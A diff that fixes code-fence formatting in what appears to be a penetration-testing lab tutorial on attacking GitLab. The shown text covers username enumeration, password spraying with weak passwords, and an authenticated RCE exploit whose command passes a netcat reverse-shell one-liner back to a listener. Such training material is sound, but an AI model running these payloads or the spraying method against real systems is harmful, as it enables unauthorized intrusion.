@@ -10,8 +10,7 @@ As we saw in the previous section, even unauthenticated access to a GitLab insta
 
 Though not considered a vulnerability by GitLab as seen on their [Hackerone](https://hackerone.com/gitlab?type=team) page ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"), it is still something worth checking as it could result in access if users are selecting weak passwords. We can do this manually, of course, but scripts make our work much faster. We can write one ourselves in Bash or Python or use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum). As with any type of password spraying attack, we should be mindful of account lockout and other kinds of interruptions. In versions below 16.6, GitLab's defaults are set to 10 failed login attempts, resulting in an automatic unlock after 10 minutes. Previously, changing these settings required compiling GitLab from source, as there was no option to modify them through the admin UI. However, starting with GitLab version 16.6, administrators can now configure these values directly through the admin UI. The number of authentication attempts before locking an account and the unlock period can be set using the `max_login_attempts` and `failed_login_attempts_unlock_period_in_minutes` settings, respectively. This configuration can be found [here](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/8_devise.rb). However, if these settings are not manually configured, they will still default to 10 failed login attempts and an unlock period of 10 minutes. Additionally, while admins can modify the minimum password length to encourage stronger passwords, this alone will not fully mitigate the risk of password attacks.
 
-```
-        shellsession
+```shellsession
 # Number of authentication tries before locking an account if lock_strategy
 # is failed attempts.
 config.maximum_attempts = 10
@@ -22,8 +21,7 @@ config.unlock_in = 10.minutes
 
 Downloading the script and running it against the target GitLab instance, we see that there are two valid usernames, `root` (the built-in admin account) and `bob`. If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as `Welcome1` or `Password123`, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -61,8 +59,7 @@ Remote code execution vulnerabilities are typically considered the "cream of the
 
 As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 
 [1] Authenticating
@@ -74,8 +71,7 @@ Successfully Authenticated
 
 And we get a shell almost instantly.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
